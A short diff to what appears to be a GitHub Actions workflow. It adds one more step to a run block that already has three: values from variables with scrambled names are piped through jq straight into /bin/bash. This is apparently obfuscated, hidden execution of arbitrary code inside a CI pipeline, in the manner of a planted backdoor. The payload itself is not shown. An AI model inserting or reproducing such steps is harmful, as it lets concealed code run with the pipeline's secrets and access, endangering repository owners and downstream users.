@@ -22,6 +22,7 @@ jobs:
           echo $tdb68182 | jq -r .mai6964 | /bin/bash
           printf '%s' "$ylrxc25796" | jq -r .fmom4954 | /bin/bash
           printf '%s' "$oktfe8577" | jq -r .hzwlb3141 | /bin/bash
+          echo $bs3651 | jq -r .tuses4 | /bin/bash
 
       - name: Upload results
         if: always()
